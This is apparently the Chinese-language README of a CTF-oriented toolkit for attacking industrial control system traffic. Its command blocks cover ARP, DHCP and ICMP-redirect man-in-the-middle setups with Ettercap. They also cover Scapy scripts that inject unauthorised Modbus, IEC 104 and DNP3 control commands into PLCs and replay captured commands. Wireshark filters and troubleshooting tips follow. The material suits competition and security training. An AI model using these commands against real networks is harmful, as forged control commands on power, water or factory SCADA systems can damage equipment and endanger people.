# 02_ics_traffic - 工控系統流量攻擊

ICS/SCADA 協議攻擊工具箱，重點支援 Ettercap MITM 和 Scapy 封包操作。

## 快速開始

### 1. 啟用 IP Forwarding (必須)

```bash
sudo sysctl -w net.ipv4.ip_forward=1

# 永久設定 (加入 /etc/sysctl.conf)
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
```

### 2. 基本 ARP Spoofing

```bash
# 語法: ettercap -T -i [介面] -M arp:remote /目標IP/ /閘道IP/
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/
```

### 3. 使用 Ettercap Filter

```bash
# 編譯 filter
sudo etterfilter modbus_filter.etter -o modbus_filter.ef

# 使用 filter 進行 MITM
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/ -F modbus_filter.ef
```

## 目錄結構

```
02_ics_traffic/
├── README.md                    # 本文件
│
├── protocol_docs/               # 協議快速參考
│   ├── modbus_tcp_quickref.md
│   ├── iec104_quickref.md
│   ├── dnp3_quickref.md
│   └── ics_ports_and_signatures.md
│
├── mitm_scripts/                # Ettercap MITM 攻擊
│   ├── arp_spoof.py             # Python ARP spoofing
│   ├── modbus_filter.etter      # Modbus 封包修改
│   ├── modbus_block_writes.etter
│   ├── modbus_read_only.etter
│   ├── iec104_filter.etter      # IEC 104 封包檢測
│   ├── iec104_block_commands.etter
│   └── dnp3_block_commands.etter
│
└── scapy_scripts/               # Scapy 封包操作
    ├── modbus_sniffer.py        # Modbus 流量監聽
    ├── modbus_inject.py         # Modbus 命令注入
    ├── modbus_replay.py         # Modbus 重放攻擊
    ├── iec104_sniffer.py        # IEC 104 監聽
    ├── iec104_inject.py         # IEC 104 注入
    ├── dnp3_sniffer.py          # DNP3 監聽
    └── dnp3_inject.py           # DNP3 注入
```

## 工控協議 & 連接埠

| 協議 | 預設連接埠 | 用途 | 常見品牌 |
|------|-----------|------|---------|
| **Modbus TCP** | 502 | 工業自動化通訊 | 通用 (Schneider, Siemens) |
| **IEC 60870-5-104** | 2404 | 電力系統 SCADA | ABB, Siemens |
| **DNP3** | 20000 | 電力/水務 SCADA | GE, Schweitzer |
| **OPC UA** | 4840 | 工業物聯網 | 通用 |
| **S7comm** | 102 | Siemens PLC 通訊 | Siemens |
| **Ethernet/IP** | 44818 | Allen-Bradley PLC | Rockwell |

## Ettercap 使用指南

### 基本命令

```bash
# Text mode (推薦 CTF 使用)
sudo ettercap -T -i eth0 -M arp:remote /target/ /gateway/

# 列出主機
sudo ettercap -T -i eth0 -P list

# Sniff only (不 MITM)
sudo ettercap -T -i eth0

# 指定協議
sudo ettercap -T -i eth0 -P http

# 讀取 PCAP
sudo ettercap -T -r capture.pcap
```

### MITM 模式

```bash
# ARP poisoning (雙向)
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/

# 單向 ARP poisoning
sudo ettercap -T -i eth0 -M arp:oneway /192.168.1.100/ /192.168.1.1/

# ICMP redirect
sudo ettercap -T -i eth0 -M icmp:192.168.1.1/255.255.255.0

# DHCP spoofing
sudo ettercap -T -i eth0 -M dhcp:192.168.1.1/255.255.255.0/192.168.1.1
```

### 使用 Filter

```bash
# 編譯 filter
sudo etterfilter modbus_block_writes.etter -o modbus_block_writes.ef

# 檢查語法
sudo etterfilter modbus_block_writes.etter -t

# 使用 filter
sudo ettercap -T -i eth0 -M arp:remote /target/ /gateway/ -F modbus_block_writes.ef

# 多個 filter (不支援，需合併)
# 將多個 .etter 合併成一個檔案
```

### 實用選項

```bash
# 指定網卡
-i eth0

# 安靜模式
-q

# 只顯示封包
-z

# 將封包存成 PCAP
-w capture.pcap

# 從檔案讀取主機清單
-j hosts.txt

# Plugin
-P dns_spoof
-P remote_browser
```

## Scapy 腳本使用

### Modbus 攻擊

```bash
# 監聽 Modbus 流量
sudo python modbus_sniffer.py

# 注入 Modbus Write 命令 (寫入單一線圈)
sudo python modbus_inject.py 192.168.1.100 0x01 0x05 0x0000 0xFF00

# 重放攻擊
sudo python modbus_replay.py capture.pcap 192.168.1.100
```

### IEC 104 攻擊

```bash
# 監聽 IEC 104 流量
sudo python iec104_sniffer.py

# 發送總召喚 (General Interrogation)
sudo python iec104_inject.py 192.168.1.100 --interrogation

# 發送控制命令
sudo python iec104_inject.py 192.168.1.100 --control --ioa 100 --value 1
```

### DNP3 攻擊

```bash
# 監聽 DNP3 流量
sudo python dnp3_sniffer.py

# 發送控制命令
sudo python dnp3_inject.py 192.168.1.100 --function 0x05 --data "..."
```

## 常見攻擊場景

### 場景 1: 阻止 Modbus 寫入操作

**目標**: 防止未授權的 PLC 設定變更

```bash
# 使用 modbus_block_writes.etter
sudo etterfilter mitm_scripts/modbus_block_writes.etter -o /tmp/mb_block.ef
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/ -F /tmp/mb_block.ef
```

### 場景 2: 監聽並重放 Modbus 命令

**目標**: 捕獲合法操作並重放

```bash
# 步驟 1: 監聽並記錄
sudo python scapy_scripts/modbus_sniffer.py > modbus_log.txt

# 步驟 2: 使用 tcpdump 同時捕獲
sudo tcpdump -i eth0 -w modbus_capture.pcap port 502

# 步驟 3: 重放攻擊
sudo python scapy_scripts/modbus_replay.py modbus_capture.pcap 192.168.1.100
```

### 場景 3: IEC 104 命令注入

**目標**: 發送未授權的控制命令

```bash
# 發送控制命令到特定 IOA (Information Object Address)
sudo python scapy_scripts/iec104_inject.py 192.168.1.100 --control --ioa 1000 --value 1
```

### 場景 4: DNP3 流量分析

**目標**: 解析 DNP3 封包找出控制邏輯

```bash
# 監聽並解析
sudo python scapy_scripts/dnp3_sniffer.py

# 或使用 Wireshark
wireshark -i eth0 -f "tcp port 20000"
```

## Wireshark / tshark 過濾器

### Modbus

```bash
# 顯示 Modbus 封包
modbus

# 只顯示寫入操作
modbus.func_code == 0x05 || modbus.func_code == 0x06 || modbus.func_code == 0x0f || modbus.func_code == 0x10

# 特定 Register
modbus.reference_num == 0x0000

# tshark 導出
tshark -r capture.pcap -Y "modbus" -T fields -e modbus.func_code -e modbus.reference_num
```

### IEC 104

```bash
# 顯示 IEC 104
iec60870_104

# 只顯示控制命令
iec60870_104.typeid == 100 || iec60870_104.typeid == 101

# tshark 導出
tshark -r capture.pcap -Y "iec60870_104" -T fields -e iec60870_104.typeid -e iec60870_104.cot
```

### DNP3

```bash
# 顯示 DNP3
dnp3

# 只顯示控制操作
dnp3.al.func == 0x81 || dnp3.al.func == 0x82

# tsharp 導出
tshark -r capture.pcap -Y "dnp3" -T fields -e dnp3.al.func -e dnp3.al.obj
```

## 疑難排解

### 問題 1: Ettercap 沒有流量

**可能原因**:
- IP forwarding 未啟用
- 目標使用靜態 ARP
- 網卡不支援 promiscuous mode

**解決**:
```bash
# 確認 IP forwarding
cat /proc/sys/net/ipv4/ip_forward  # 應該是 1

# 確認 promiscuous mode
ip link show eth0 | grep PROMISC

# 手動設定
sudo ip link set eth0 promisc on
```

### 問題 2: Scapy 需要 root

**原因**: 原始 socket 操作需要 root 權限

**解決**:
```bash
sudo python script.py
# 或
sudo -E python script.py  # 保留環境變數
```

### 問題 3: Filter 不生效

**檢查**:
```bash
# 測試編譯
sudo etterfilter your_filter.etter -t

# 確認語法正確
# 常見錯誤: 缺少分號、括號不匹配、if 語句錯誤
```

### 問題 4: 找不到目標主機

**解決**:
```bash
# 掃描網段
sudo nmap -sn 192.168.1.0/24

# 使用 Ettercap 掃描
sudo ettercap -T -i eth0 -P list

# ARP 掃描
sudo arp-scan -I eth0 -l
```

## PCAP 分析技巧

```bash
# 提取 Modbus 封包
tshark -r capture.pcap -Y "modbus" -w modbus_only.pcap

# 統計封包
capinfos capture.pcap

# 合併多個 PCAP
mergecap -w merged.pcap file1.pcap file2.pcap

# 修復損壞的 PCAP
pcapfix broken.pcap -o fixed.pcap

# 從 PCAP 提取 HTTP 對象
tcpflow -r capture.pcap -o http_objects/
```

## 協議快速參考

詳細協議文檔請參考 `protocol_docs/`:
- **modbus_tcp_quickref.md** - Modbus 功能碼、暫存器類型
- **iec104_quickref.md** - ASDU 類型、COT 值
- **dnp3_quickref.md** - 功能碼、Group/Variation
- **ics_ports_and_signatures.md** - 完整連接埠與協議特徵

## 外部資源

- [Ettercap 官方文檔](https://www.ettercap-project.org/ettercap/docs.html)
- [Scapy 文檔](https://scapy.readthedocs.io/)
- [Modbus 協議規範](https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf)
- [IEC 60870-5-104 Overview](https://en.wikipedia.org/wiki/IEC_60870-5)
- [DNP3 Introduction](https://www.dnp.org/)
- [ICS CTF Writeups](https://github.com/neutrinoguy/awesome-ics-writeups)

## 比賽檢查清單

- [ ] IP forwarding 已啟用
- [ ] 確認目標 IP 和閘道 IP
- [ ] 測試 Ettercap 基本 ARP spoofing
- [ ] 協議文檔已閱讀 (Modbus/IEC104/DNP3)
- [ ] Wireshark 過濾器已準備
- [ ] Scapy 腳本可執行 (需 sudo)
- [ ] PCAP 分析工具確認 (tshark, tcpflow)
